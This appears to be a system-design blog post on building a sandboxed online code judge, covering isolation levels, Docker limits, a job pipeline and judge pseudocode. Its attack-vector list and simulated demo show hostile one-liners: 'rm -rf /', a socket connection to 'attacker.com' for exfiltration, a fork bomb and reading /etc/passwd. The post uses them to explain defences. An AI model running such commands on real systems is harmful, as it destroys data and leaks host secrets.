---
layout: post
title: "System Design: Online Code Judge — How LeetCode Runs Your Code Safely at Scale"
date: 2026-06-08 10:00:00 +0000
categories: ["post"]
tags: [system-design, docker, sandboxing, queue, code-execution, security, web, interview]
series: "System Design: Web Scenarios"
---

<div style="display:inline-flex;align-items:center;gap:.5rem;background:#1e1f24;border:1px solid #2e2f35;border-radius:20px;padding:5px 14px;font-size:.75rem;color:rgba(255,255,255,.55);margin-bottom:1.5rem;">
  <span style="color:#fbef8a;font-weight:700;">Series</span>
  System Design: Web Scenarios &mdash; Online Code Judge
</div>

{: class="marginalia" }
LeetCode processes over<br/>**1 million** code submissions<br/>per day at peak contest<br/>times. Running untrusted<br/>code at that scale is<br/>a hard security problem.

You get the question in the interview: *"Design an online code judge like LeetCode."* Users submit Python, Java, C++, or JavaScript. The system compiles and runs their code against hidden test cases. It returns: **Accepted**, **Wrong Answer**, **Time Limit Exceeded**, **Memory Limit Exceeded**, or **Runtime Error**. And it must handle malicious code safely.

This post works through the problem from first principles — from naive process spawning all the way to production-grade container sandboxing, queue-based judging, and scaling to millions of submissions.

---

<style>
/* ─── Code blocks ───────────────────────────────────────────────── */
.code-wrap {
  position: relative; background: #111214; border: 1px solid #2e2f35;
  border-radius: 10px; overflow: hidden; margin: 1rem 0;
}
.code-lang {
  background: #1c1d22; padding: 6px 16px; font-size: 11px;
  color: rgba(255,255,255,.38); letter-spacing: .08em; text-transform: uppercase;
  display: flex; justify-content: space-between; align-items: center;
}
.copy-btn {
  background: transparent; border: 1px solid #3a3b40; border-radius: 4px;
  color: rgba(255,255,255,.45); font-size: 11px; padding: 2px 8px;
  cursor: pointer; font-family: inherit; transition: all .2s;
}
.copy-btn:hover, .copy-btn.copied { border-color: #7bcdab; color: #7bcdab; }
.code-wrap pre.code-block {
  margin: 0; padding: 16px 20px; overflow-x: auto;
  font-family: "JetBrains Mono", "Fira Code", monospace; font-size: 13px;
  line-height: 1.65; color: rgba(255,255,255,.85);
  background: transparent !important; border: none !important;
}
.kw  { color: #cc99cd; }
.ty  { color: #7bcdab; }
.st  { color: #f8c555; }
.cm  { color: #5a6272; font-style: italic; }
.fn  { color: #89c0d0; }
.nu  { color: #f08080; }
.pp  { color: #fbef8a; }
.op  { color: rgba(255,255,255,.5); }

/* ─── Callouts ──────────────────────────────────────────────────── */
.callout { border-radius: 8px; padding: 1rem 1.2rem; margin: 1rem 0; font-size: .84rem; line-height: 1.7; }
.callout-green  { background: #1a2e22; border-left: 3px solid #7bcdab; color: rgba(255,255,255,.82); }
.callout-yellow { background: #25240e; border-left: 3px solid #fbef8a; color: rgba(255,255,255,.82); }
.callout-red    { background: #2a1616; border-left: 3px solid #f08080; color: rgba(255,255,255,.82); }
.callout strong { color: #fff; }

/* ─── Cards ─────────────────────────────────────────────────────── */
.card {
  background: rgba(255,255,255,0.04);
  border: 1px solid rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 1.5rem;
  margin: 1rem 0;
}

/* ─── Buttons ───────────────────────────────────────────────────── */
.btn-primary {
  background: #7bcdab; color: #19191c; border: none;
  border-radius: 8px; font-weight: 700;
  padding: 0.5rem 1.2rem; cursor: pointer;
  font-family: inherit; font-size: 13px; transition: all .2s;
}
.btn-primary:hover { background: #5ab592; }
.btn-primary:disabled { opacity: .45; cursor: default; }
.btn-danger {
  background: #f08080; color: #19191c; border: none;
  border-radius: 8px; font-weight: 700;
  padding: 0.5rem 1.2rem; cursor: pointer;
  font-family: inherit; font-size: 13px; transition: all .2s;
}
.btn-danger:hover { background: #d06060; }
.btn-outline {
  background: transparent; color: rgba(255,255,255,.7);
  border: 1px solid rgba(255,255,255,.2);
  border-radius: 8px; font-weight: 600;
  padding: 0.5rem 1.2rem; cursor: pointer;
  font-family: inherit; font-size: 13px; transition: all .2s;
}
.btn-outline:hover { border-color: #7bcdab; color: #7bcdab; }
.btn-outline.active { border-color: #7bcdab; color: #7bcdab; background: rgba(123,205,171,.1); }

/* ─── Stat grid ─────────────────────────────────────────────────── */
.stat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; margin: 1.5rem 0; }
@media (max-width: 680px) { .stat-grid { grid-template-columns: repeat(2, 1fr); } }
.stat-card {
  background: #1a1b1f; border: 1px solid #2e2f35; border-radius: 10px;
  padding: 1rem; text-align: center;
}
.stat-num { font-size: 1.5rem; font-weight: 700; color: #fbef8a; line-height: 1.1; }
.stat-label { font-size: .72rem; color: rgba(255,255,255,.45); text-transform: uppercase; letter-spacing: .06em; margin-top: .3rem; }

/* ─── Sandbox level selector ────────────────────────────────────── */
.sandbox-demo {
  background: #1a1b1f; border: 1px solid #2e2f35; border-radius: 14px;
  padding: 1.6rem; margin: 1.8rem 0;
}
.sandbox-demo h3 { color: #fbef8a; margin: 0 0 1rem; font-size: 1rem; display: flex; align-items: center; gap: .5rem; }
.level-tabs { display: flex; gap: .5rem; flex-wrap: wrap; margin-bottom: 1.2rem; }
.level-tab {
  padding: 6px 16px; border-radius: 20px; border: 1px solid #2e2f35;
  background: transparent; color: rgba(255,255,255,.5); cursor: pointer;
  font-family: inherit; font-size: .78rem; font-weight: 600; transition: all .2s;
}
.level-tab:hover { border-color: #7bcdab; color: #7bcdab; }
.level-tab.active { background: #7bcdab; border-color: #7bcdab; color: #19191c; }
.level-panel { display: none; }
.level-panel.active { display: block; }
.threat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: .8rem; margin-top: .8rem; }
@media (max-width: 600px) { .threat-grid { grid-template-columns: 1fr; } }
.threat-item { display: flex; align-items: center; gap: .5rem; font-size: .8rem; }
.threat-icon { font-size: 1rem; flex-shrink: 0; }
.threat-blocked { color: #7bcdab; }
.threat-allowed { color: #f08080; }

/* ─── Sandbox playground ────────────────────────────────────────── */
.sandbox-playground {
  background: #111214; border: 1px solid #2e2f35; border-radius: 10px;
  padding: 1.2rem; margin-top: 1rem;
}
.sb-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1rem; }
@media (max-width: 600px) { .sb-row { grid-template-columns: 1fr; } }
.sb-label { font-size: .7rem; text-transform: uppercase; letter-spacing: .07em; color: rgba(255,255,255,.4); margin-bottom: .4rem; }
.sb-editor {
  width: 100%; height: 130px; background: #0e0f11; border: 1px solid #2e2f35;
  border-radius: 6px; color: rgba(255,255,255,.85); font-family: "JetBrains Mono", monospace;
  font-size: 12px; padding: 10px; resize: none; box-sizing: border-box; line-height: 1.65;
}
.sb-editor:focus { outline: none; border-color: #7bcdab; }
.sb-output {
  background: #0e0f11; border: 1px solid #2e2f35; border-radius: 6px;
  padding: 10px; min-height: 130px; font-family: "JetBrains Mono", monospace;
  font-size: 12px; line-height: 1.7; color: rgba(255,255,255,.75); white-space: pre-wrap;
}
.sb-controls { display: flex; gap: .6rem; flex-wrap: wrap; align-items: center; }
.verdict-accepted { color: #7bcdab; font-weight: 700; }
.verdict-tle      { color: #fbef8a; font-weight: 700; }
.verdict-re       { color: #f08080; font-weight: 700; }
.verdict-danger   { color: #f08080; font-weight: 700; font-size: 1.1rem; }
.anim-danger { animation: flashRed 0.4s ease-in-out 3; }
@keyframes flashRed { 0%,100% { background: transparent; } 50% { background: rgba(240,80,80,.15); } }

/* ─── Architecture pipeline ─────────────────────────────────────── */
.arch-pipeline {
  background: #111214; border: 1px solid #2e2f35; border-radius: 14px;
  padding: 1.6rem; margin: 1.8rem 0;
}
.arch-pipeline h3 { color: #fbef8a; margin: 0 0 1.2rem; font-size: 1rem; display: flex; align-items: center; gap: .5rem; }
.pipeline-stages { display: flex; flex-wrap: wrap; gap: 0; align-items: center; margin-bottom: 1.2rem; }
.pipeline-stage {
  background: #1a1b1f; border: 1px solid #2e2f35; border-radius: 8px;
  padding: 8px 14px; font-size: .78rem; color: rgba(255,255,255,.55);
  cursor: pointer; transition: all .2s; display: flex; align-items: center; gap: .4rem;
}
.pipeline-stage:hover { border-color: #7bcdab; color: rgba(255,255,255,.85); }
.pipeline-stage.active { border-color: #7bcdab; background: rgba(123,205,171,.12); color: #7bcdab; font-weight: 700; }
.pipeline-arrow { color: rgba(255,255,255,.2); font-size: 18px; padding: 0 2px; }
.stage-detail {
  background: #1a1b1f; border: 1px solid #2e2f35; border-radius: 10px;
  padding: 1.2rem; min-height: 80px;
}
.stage-detail-title { color: #fbef8a; font-size: .9rem; font-weight: 700; margin-bottom: .5rem; display: flex; align-items: center; gap: .5rem; }
.stage-detail-body { color: rgba(255,255,255,.75); font-size: .83rem; line-height: 1.8; }
.stage-detail-body code { background: #111214; border-radius: 4px; padding: 1px 5px; font-family: "JetBrains Mono", monospace; font-size: .8em; color: #7bcdab; }

/* ─── Language comparison table ─────────────────────────────────── */
.lang-table { width: 100%; border-collapse: collapse; font-size: .82rem; margin: 1rem 0; }
.lang-table th {
  background: #1e1f24; color: rgba(255,255,255,.5);
  font-size: .7rem; text-transform: uppercase; letter-spacing: .07em;
  padding: 8px 14px; text-align: left; border-bottom: 1px solid #2e2f35;
}
.lang-table td { padding: 9px 14px; border-bottom: 1px solid #1e1f24; color: rgba(255,255,255,.75); vertical-align: top; }
.lang-table tr:hover td { background: rgba(255,255,255,.02); }
.lang-badge {
  display: inline-block; border-radius: 4px; padding: 2px 8px;
  font-size: .7rem; font-weight: 700; letter-spacing: .04em;
}
.lang-py  { background: rgba(59,130,246,.15); color: #60a5fa; }
.lang-cpp { background: rgba(123,205,171,.12); color: #7bcdab; }
.lang-java { background: rgba(251,239,138,.12); color: #fbef8a; }
.lang-js  { background: rgba(240,128,128,.12); color: #f08080; }

/* ─── Capacity table ────────────────────────────────────────────── */
.cap-table { width: 100%; border-collapse: collapse; font-size: .83rem; margin: 1rem 0; }
.cap-table th {
  background: #1e1f24; color: rgba(255,255,255,.5);
  font-size: .7rem; text-transform: uppercase; letter-spacing: .07em;
  padding: 8px 14px; text-align: left; border-bottom: 1px solid #2e2f35;
}
.cap-table td { padding: 9px 14px; border-bottom: 1px solid #1e1f24; color: rgba(255,255,255,.75); }
.cap-table td:last-child { color: #fbef8a; font-weight: 600; font-family: "JetBrains Mono", monospace; }
.cap-table tr:hover td { background: rgba(255,255,255,.02); }

/* ─── Judge demo ────────────────────────────────────────────────── */
.judge-demo {
  background: #1a1b1f; border: 1px solid #2e2f35; border-radius: 14px;
  padding: 1.6rem; margin: 1.8rem 0;
}
.judge-demo h3 { color: #fbef8a; margin: 0 0 1rem; font-size: 1rem; display: flex; align-items: center; gap: .5rem; }
.judge-top { display: grid; grid-template-columns: 1fr auto; gap: 1rem; align-items: start; margin-bottom: 1rem; }
@media (max-width: 600px) { .judge-top { grid-template-columns: 1fr; } }
.lang-select {
  background: #111214; border: 1px solid #2e2f35; border-radius: 6px;
  color: rgba(255,255,255,.85); padding: 6px 12px;
  font-family: inherit; font-size: 13px; cursor: pointer;
}
.lang-select:focus { outline: none; border-color: #7bcdab; }
.judge-editor {
  width: 100%; height: 180px; background: #111214; border: 1px solid #2e2f35;
  border-radius: 8px; color: rgba(255,255,255,.85); font-family: "JetBrains Mono", monospace;
  font-size: 12.5px; padding: 12px; resize: vertical; box-sizing: border-box; line-height: 1.65;
  margin-bottom: .8rem;
}
.judge-editor:focus { outline: none; border-color: #7bcdab; }
.tc-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: .5rem; margin-bottom: 1rem; }
.tc-card {
  background: #111214; border: 1px solid #2e2f35; border-radius: 8px;
  padding: 8px; text-align: center; font-size: .75rem; transition: all .35s;
}
.tc-card .tc-label { color: rgba(255,255,255,.4); font-size: .65rem; text-transform: uppercase; letter-spacing: .06em; }
.tc-card .tc-input { color: rgba(255,255,255,.65); font-family: "JetBrains Mono", monospace; font-size: .8rem; margin: 2px 0; }
.tc-card .tc-status { font-size: .85rem; margin-top: 3px; }
.tc-card.pass { border-color: #7bcdab; background: rgba(123,205,171,.07); }
.tc-card.fail { border-color: #f08080; background: rgba(240,128,128,.07); }
.tc-card.running { border-color: #fbef8a; background: rgba(251,239,138,.07); animation: pulse .8s ease-in-out infinite; }
@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .5; } }
.judge-verdict {
  background: #111214; border: 1px solid #2e2f35; border-radius: 8px;
  padding: 1rem; font-family: "JetBrains Mono", monospace; font-size: .85rem;
  color: rgba(255,255,255,.6); min-height: 60px; line-height: 1.8;
}
.scenario-btns { display: flex; gap: .5rem; flex-wrap: wrap; margin-bottom: .8rem; }
.scenario-btn {
  padding: 5px 14px; border-radius: 6px; border: 1px solid #2e2f35;
  background: transparent; color: rgba(255,255,255,.5); cursor: pointer;
  font-family: inherit; font-size: .75rem; transition: all .2s;
}
.scenario-btn:hover { border-color: #7bcdab; color: #7bcdab; }
.scenario-btn.active { background: rgba(123,205,171,.1); border-color: #7bcdab; color: #7bcdab; }
</style>

## 1. The core challenge: untrusted code execution

Running arbitrary user code is extremely dangerous. Consider what a malicious user could submit:

<div class="card">
<strong style="color:#f08080;">Attack vectors in user-submitted code</strong>
<ul style="margin:.8rem 0 0;padding-left:1.3rem;color:rgba(255,255,255,.75);line-height:2;font-size:.85rem;">
  <li><code style="color:#f08080;font-family:'JetBrains Mono',monospace;">import os; os.system("rm -rf /")</code> — destroy the filesystem</li>
  <li><code style="color:#f08080;font-family:'JetBrains Mono',monospace;">while True: pass</code> — infinite loop, CPU starvation</li>
  <li><code style="color:#f08080;font-family:'JetBrains Mono',monospace;">x = [0] * (10**12)</code> — allocate 8 TB, crash the machine</li>
  <li><code style="color:#f08080;font-family:'JetBrains Mono',monospace;">import socket; socket.connect(("attacker.com", 443))</code> — exfiltrate data</li>
  <li><code style="color:#f08080;font-family:'JetBrains Mono',monospace;">import os; os.fork()</code> repeated — fork bomb, exhaust process table</li>
  <li><code style="color:#f08080;font-family:'JetBrains Mono',monospace;">open("/etc/passwd", "r").read()</code> — read host secrets</li>
</ul>
</div>

The system must be **completely sandboxed**: every submission runs in an isolated environment where it cannot harm the host system, other users, or the network.

<div class="callout callout-yellow">
<strong>The fundamental tension:</strong> you want fast execution (users hate waiting 10 seconds for results) but strong isolation (you cannot trust the code). These goals are in opposition — stronger sandboxing generally means more overhead.
</div>

---

## 2. Sandbox approaches (progressive)

<div class="sandbox-demo">
  <h3>🔒 Sandbox Level Explorer</h3>
  <div class="level-tabs">
    <button class="level-tab active" onclick="showLevel(1)">Level 1: Process</button>
    <button class="level-tab" onclick="showLevel(2)">Level 2: chroot</button>
    <button class="level-tab" onclick="showLevel(3)">Level 3: Docker</button>
    <button class="level-tab" onclick="showLevel(4)">Level 4: gVisor/Firecracker</button>
  </div>

  <div id="level-1" class="level-panel active">
    <div class="card" style="margin:0;">
      <div style="color:#fbef8a;font-weight:700;margin-bottom:.5rem;">Level 1 — Process-level isolation</div>
      <p style="color:rgba(255,255,255,.75);font-size:.85rem;line-height:1.75;margin:0 0 .8rem;">Spawn the user's code as a child process with a timeout. Simple and fast — but extremely weak. The process still runs as a system user with access to the full filesystem and network.</p>
      <div style="font-size:.78rem;color:rgba(255,255,255,.5);font-family:'JetBrains Mono',monospace;background:#111214;border-radius:6px;padding:.8rem;margin-bottom:.8rem;">subprocess.run(["python3", "solution.py"], timeout=5, capture_output=True)</div>
      <div class="threat-grid">
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">CPU time limit (timeout)</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Filesystem access (rm -rf /)</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Network access</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Memory exhaustion</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Reading /etc/passwd</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Fork bomb</span></div>
      </div>
    </div>
  </div>

  <div id="level-2" class="level-panel">
    <div class="card" style="margin:0;">
      <div style="color:#fbef8a;font-weight:700;margin-bottom:.5rem;">Level 2 — chroot jail</div>
      <p style="color:rgba(255,255,255,.75);font-size:.85rem;line-height:1.75;margin:0 0 .8rem;">Change the root directory for the process. The sandboxed process sees only a minimal directory tree — it cannot reach <code style="font-family:'JetBrains Mono',monospace;">/etc</code>, <code style="font-family:'JetBrains Mono',monospace;">/home</code>, or other host paths. Better, but shares the host kernel — a kernel exploit escapes the jail entirely.</p>
      <div class="threat-grid">
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">CPU time limit</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Filesystem access (mostly)</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Network access</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Memory exhaustion</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Kernel exploits</span></div>
        <div class="threat-item"><span class="threat-icon">❌</span><span class="threat-allowed">Fork bomb</span></div>
      </div>
    </div>
  </div>

  <div id="level-3" class="level-panel">
    <div class="card" style="margin:0;">
      <div style="color:#fbef8a;font-weight:700;margin-bottom:.5rem;">Level 3 — Docker containers</div>
      <p style="color:rgba(255,255,255,.75);font-size:.85rem;line-height:1.75;margin:0 0 .8rem;">Full Linux namespace isolation: filesystem, network, PID, user namespaces. Combined with cgroup resource limits. Each submission gets a fresh container that is destroyed after execution. This is production-viable for most judges.</p>
      <div style="font-size:.75rem;color:rgba(255,255,255,.5);font-family:'JetBrains Mono',monospace;background:#111214;border-radius:6px;padding:.8rem;margin-bottom:.8rem;">docker run --rm \<br/>  --network none \<br/>  --memory 256m \<br/>  --cpus 0.5 \<br/>  --read-only \<br/>  --pids-limit 64 \<br/>  judge-runner:latest python3 solution.py</div>
      <div class="threat-grid">
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">CPU limit (--cpus)</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Filesystem isolation</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Network isolation (--network none)</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Memory limit (--memory)</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Fork bomb (--pids-limit)</span></div>
        <div class="threat-item"><span class="threat-icon">⚠️</span><span style="color:#fbef8a;">Kernel exploits (shared kernel)</span></div>
      </div>
    </div>
  </div>

  <div id="level-4" class="level-panel">
    <div class="card" style="margin:0;">
      <div style="color:#fbef8a;font-weight:700;margin-bottom:.5rem;">Level 4 — gVisor / Firecracker microVMs</div>
      <p style="color:rgba(255,255,255,.75);font-size:.85rem;line-height:1.75;margin:0 0 .8rem;"><strong style="color:#7bcdab;">gVisor</strong> implements a Linux-compatible kernel in Go running entirely in userspace. Syscalls from the sandboxed process go to gVisor's kernel, not the host kernel — a kernel exploit only escapes into gVisor, which is isolated. <strong style="color:#7bcdab;">Firecracker</strong> (used by AWS Lambda) boots a full microVM in ~125ms using KVM hardware virtualization. Maximum isolation at near-container overhead.</p>
      <div class="threat-grid">
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">CPU limit</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Filesystem isolation</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Network isolation</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Memory limit</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Fork bomb</span></div>
        <div class="threat-item"><span class="threat-icon">✅</span><span class="threat-blocked">Kernel exploits (intercepted)</span></div>
      </div>
    </div>
  </div>
</div>

### Sandbox in action

<div class="sandbox-playground">
  <div class="sb-label">Malicious code (pre-loaded)</div>
  <div class="sb-row">
    <div>
      <textarea id="sb-code" class="sb-editor">import os
os.system('rm -rf /')
print("Done. Everything is gone.")</textarea>
    </div>
    <div>
      <div class="sb-label">Execution log</div>
      <div id="sb-output" class="sb-output" style="font-size:.78rem;">Click "Run without sandbox" or "Run in Docker" to simulate execution.</div>
    </div>
  </div>
  <div class="sb-controls">
    <button class="btn-danger" onclick="runUnsandboxed()">&#9888; Run without sandbox</button>
    <button class="btn-primary" onclick="runInDocker()">&#x1F433; Run in Docker</button>
  </div>
</div>

<script>
function showLevel(n) {
  document.querySelectorAll('.level-tab').forEach(function(t, i) {
    t.classList.toggle('active', i === n - 1);
  });
  document.querySelectorAll('.level-panel').forEach(function(p, i) {
    p.classList.toggle('active', i === n - 1);
  });
}

function runUnsandboxed() {
  var out = document.getElementById('sb-output');
  var wrap = out.parentElement.parentElement;
  out.innerHTML = '<span style="color:#fbef8a;">$ python3 solution.py</span>\n';
  wrap.classList.add('anim-danger');
  setTimeout(function() {
    out.innerHTML += '<span style="color:#f08080;">⚠ Executing: os.system("rm -rf /")</span>\n';
  }, 300);
  setTimeout(function() {
    out.innerHTML += '<span style="color:#f08080;">Removing /etc/passwd... done</span>\n';
    out.innerHTML += '<span style="color:#f08080;">Removing /home/user... done</span>\n';
    out.innerHTML += '<span style="color:#f08080;">Removing /var/log... done</span>\n';
    out.innerHTML += '<span style="color:#f08080;">Removing /usr/bin... done</span>\n';
  }, 700);
  setTimeout(function() {
    out.innerHTML += '<span class="verdict-danger">💥 FILESYSTEM DESTROYED. HOST IS UNRECOVERABLE.</span>\n';
    out.innerHTML += '<span style="color:#f08080;">Done. Everything is gone.</span>';
    wrap.classList.remove('anim-danger');
  }, 1400);
}

function runInDocker() {
  var out = document.getElementById('sb-output');
  out.innerHTML = '<span style="color:#7bcdab;">$ docker run --rm --network none --memory 256m --read-only judge:py solution.py</span>\n';
  setTimeout(function() {
    out.innerHTML += '<span style="color:rgba(255,255,255,.5);">Starting container judge-run-a8f3c2...</span>\n';
  }, 200);
  setTimeout(function() {
    out.innerHTML += '<span style="color:rgba(255,255,255,.5);">Container ready (cold start: 180ms)</span>\n';
    out.innerHTML += '<span style="color:rgba(255,255,255,.5);">Injecting solution.py into /sandbox/...</span>\n';
  }, 500);
  setTimeout(function() {
    out.innerHTML += '<span style="color:#fbef8a;">Executing in isolated namespace...</span>\n';
    out.innerHTML += '<span style="color:rgba(255,255,255,.5);">os.system("rm -rf /") called...</span>\n';
  }, 900);
  setTimeout(function() {
    out.innerHTML += '<span style="color:#7bcdab;">  rm: cannot remove /: Read-only file system</span>\n';
    out.innerHTML += '<span style="color:#7bcdab;">  (--read-only flag: filesystem is immutable)</span>\n';
  }, 1200);
  setTimeout(function() {
    out.innerHTML += '<span style="color:rgba(255,255,255,.5);">Container destroyed.</span>\n';
    out.innerHTML += '<span style="color:#7bcdab;">✓ Host filesystem: UNTOUCHED</span>\n';
    out.innerHTML += '<span style="color:#7bcdab;">✓ Verdict: Runtime Error (exit code 1)</span>';
  }, 1700);
}
</script>

---

## 3. System architecture

The submission flows through seven stages before a verdict reaches the user.

<div class="arch-pipeline">
  <h3>🏗️ Submission Pipeline — click each stage</h3>
  <div class="pipeline-stages" id="pipeline">
    <button class="pipeline-stage active" onclick="showStage(0)">1 Browser</button>
    <span class="pipeline-arrow">→</span>
    <button class="pipeline-stage" onclick="showStage(1)">2 API Server</button>
    <span class="pipeline-arrow">→</span>
    <button class="pipeline-stage" onclick="showStage(2)">3 Job Queue</button>
    <span class="pipeline-arrow">→</span>
    <button class="pipeline-stage" onclick="showStage(3)">4 Judge Worker</button>
    <span class="pipeline-arrow">→</span>
    <button class="pipeline-stage" onclick="showStage(4)">5 Sandbox</button>
    <span class="pipeline-arrow">→</span>
    <button class="pipeline-stage" onclick="showStage(5)">6 Database</button>
    <span class="pipeline-arrow">→</span>
    <button class="pipeline-stage" onclick="showStage(6)">7 Result Push</button>
  </div>
  <div class="stage-detail" id="stage-detail">
    <div class="stage-detail-title">🌐 Stage 1: Browser</div>
    <div class="stage-detail-body">
      User writes code in the online editor (Monaco or CodeMirror). On "Submit", the browser sends a POST request with the code, selected language, and problem ID. The browser then starts polling for the verdict — or opens a WebSocket for push notification.<br/><br/>
      <strong>Payload:</strong> <code>{ "code": "...", "language": "python3", "problemId": 42, "userId": "u_abc" }</code>
    </div>
  </div>
</div>

<script>
var stageData = [
  {
    icon: "🌐", title: "Stage 1: Browser",
    body: "User writes code in the online editor (Monaco or CodeMirror). On \"Submit\", the browser sends a POST with the code, language, and problem ID. The browser then polls for verdict — or holds open a WebSocket for push notification.<br/><br/><strong>Payload:</strong> <code>{ \"code\": \"...\", \"language\": \"python3\", \"problemId\": 42 }</code>"
  },
  {
    icon: "⚙️", title: "Stage 2: API Server",
    body: "Validates the submission: language must be supported, code size must be under 64 KB, user must not exceed rate limit (e.g. 10 submissions/minute). Assigns a unique <code>submissionId</code>, writes an initial <code>PENDING</code> record to the DB, then enqueues the job. Returns <code>202 Accepted</code> with the submissionId immediately — the user doesn't wait for judging to finish."
  },
  {
    icon: "📬", title: "Stage 3: Job Queue",
    body: "A persistent message queue — Redis Streams, AWS SQS, or Kafka. The job message contains: <code>{ submissionId, code, language, problemId, userId, enqueueTime }</code>.<br/><br/>The queue decouples the API tier from the judge tier. If all workers are busy, jobs pile up in the queue instead of timing out. Queue depth is the primary scaling signal for the worker pool."
  },
  {
    icon: "👷", title: "Stage 4: Judge Worker",
    body: "A pool of worker processes that poll the queue. Each worker handles exactly one submission at a time. The worker fetches the job, loads the problem's test cases from the DB or a fast cache (Redis), spins up a sandbox container, runs the code, collects results, and writes the verdict back. Workers are stateless and horizontally scalable."
  },
  {
    icon: "🔒", title: "Stage 5: Sandbox Container",
    body: "Each submission runs in a fresh Docker container (or gVisor-backed container): <code>--network none --memory 256m --cpus 0.5 --read-only --pids-limit 64</code>. The container is destroyed immediately after execution, even if the code crashes. Wall time, CPU time, and peak memory are measured via cgroups. Code is injected at runtime — the base image is pre-built and warm."
  },
  {
    icon: "🗄️", title: "Stage 6: Database",
    body: "Results are written to the submissions table: verdict (AC / WA / TLE / MLE / RE), per-test-case details, runtime (ms), memory (KB). A PostgreSQL write or DynamoDB put. The submissionId is the key — the result is queryable immediately after the write."
  },
  {
    icon: "📡", title: "Stage 7: Result Push",
    body: "The user's browser receives the verdict via one of two paths: (1) <strong>Polling</strong> — the browser polls GET /submission/:id every 1s until status is no longer PENDING. Simple but generates extra HTTP traffic. (2) <strong>WebSocket / Server-Sent Events</strong> — the worker notifies a WebSocket server (via Redis pub/sub) which pushes the result directly to the user's browser connection. Lower latency, no polling overhead."
  }
];
function showStage(idx) {
  document.querySelectorAll('.pipeline-stage').forEach(function(s, i) {
    s.classList.toggle('active', i === idx);
  });
  var d = stageData[idx];
  document.getElementById('stage-detail').innerHTML =
    '<div class="stage-detail-title">' + d.icon + ' ' + d.title + '</div>' +
    '<div class="stage-detail-body">' + d.body + '</div>';
}
</script>

---

## 4. Test case execution

{: class="marginalia" }
"Special judge" programs<br/>are used when a problem<br/>has multiple valid answers<br/>— e.g. any valid graph<br/>topological sort. The<br/>special judge checks<br/>correctness rather than<br/>exact string equality.

For each test case the judge follows a strict loop:

<div class="code-wrap">
  <div class="code-lang"><span>Judge Worker — pseudocode</span></div>
  <pre class="code-block"><span class="kw">function</span> <span class="fn">judgeSubmission</span>(submission, testCases):
  results <span class="op">=</span> []
  <span class="kw">for</span> tc <span class="kw">in</span> testCases:
    container <span class="op">=</span> <span class="fn">spawnSandbox</span>(submission.language)
    <span class="fn">injectCode</span>(container, submission.code)
    
    startTime  <span class="op">=</span> <span class="fn">clock</span>()
    startMem   <span class="op">=</span> <span class="fn">cgroupMemUsage</span>(container)
    
    proc <span class="op">=</span> <span class="fn">runInContainer</span>(container, stdin<span class="op">=</span>tc.input, timeout<span class="op">=</span>tc.timeLimit)
    
    elapsed    <span class="op">=</span> <span class="fn">clock</span>() <span class="op">-</span> startTime
    peakMem    <span class="op">=</span> <span class="fn">cgroupPeakMem</span>(container) <span class="op">-</span> startMem
    exitCode   <span class="op">=</span> proc.exitCode
    stdout     <span class="op">=</span> proc.stdout
    
    <span class="fn">destroyContainer</span>(container)   <span class="cm">// always, even on crash</span>
    
    <span class="kw">if</span> proc.timedOut:
      results.<span class="fn">append</span>({ status: <span class="st">"TLE"</span>, tc: tc.id })
    <span class="kw">elif</span> peakMem <span class="op">></span> tc.memLimit:
      results.<span class="fn">append</span>({ status: <span class="st">"MLE"</span>, tc: tc.id })
    <span class="kw">elif</span> exitCode <span class="op">!=</span> <span class="nu">0</span>:
      results.<span class="fn">append</span>({ status: <span class="st">"RE"</span>,  tc: tc.id, exitCode })
    <span class="kw">elif</span> tc.specialJudge:
      ok <span class="op">=</span> <span class="fn">runSpecialJudge</span>(tc, stdout)
      results.<span class="fn">append</span>({ status: ok <span class="op">?</span> <span class="st">"AC"</span> <span class="op">:</span> <span class="st">"WA"</span>, tc: tc.id })
    <span class="kw">elif</span> <span class="fn">normalize</span>(stdout) <span class="op">!=</span> <span class="fn">normalize</span>(tc.expected):
      results.<span class="fn">append</span>({ status: <span class="st">"WA"</span>, tc: tc.id, got: stdout })
    <span class="kw">else</span>:
      results.<span class="fn">append</span>({ status: <span class="st">"AC"</span>, tc: tc.id, time: elapsed, mem: peakMem })
    
    <span class="kw">if</span> results.last.status <span class="op">!=</span> <span class="st">"AC"</span>:
      <span class="kw">break</span>   <span class="cm">// early exit on first failure</span>
  
  <span class="kw">return</span> <span class="fn">summarize</span>(results)</pre>
</div>

**Measuring resource usage accurately:**

- **Wall time:** measured by the host using `clock_gettime(CLOCK_REALTIME)` around `wait4()` — not self-reported by the process
- **CPU time:** read from cgroup `cpuacct.usage` after execution — isolates pure compute time from I/O waits
- **Peak memory:** read from cgroup `memory.max_usage_in_bytes` — the high-water mark during the entire run
